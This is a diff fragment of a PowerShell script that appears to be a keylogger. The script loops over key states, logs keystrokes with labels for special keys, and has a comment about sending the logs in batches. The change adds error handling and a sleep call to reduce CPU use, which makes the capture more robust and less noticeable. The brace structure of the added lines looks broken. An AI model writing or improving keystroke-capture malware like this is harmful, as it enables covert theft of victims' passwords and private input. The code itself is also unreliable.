@@ -50,11 +50,16 @@ while ($true) {
                 8  { "[BACKSPACE]" }
                 9  { "[TAB]" }
                 32 { "[SPACE]" }
-                default { [char]$i }
+                default { 
+                    try { [char]$i } catch { "[UNKNOWN]" } 
+                }
             }
             $log += "$key "
         }
     }
+    Start-Sleep -Milliseconds 10  # Reduce CPU usage
+}
+
     
     # Send logs in batches to avoid spamming
     if ($log.Length -gt 5) {
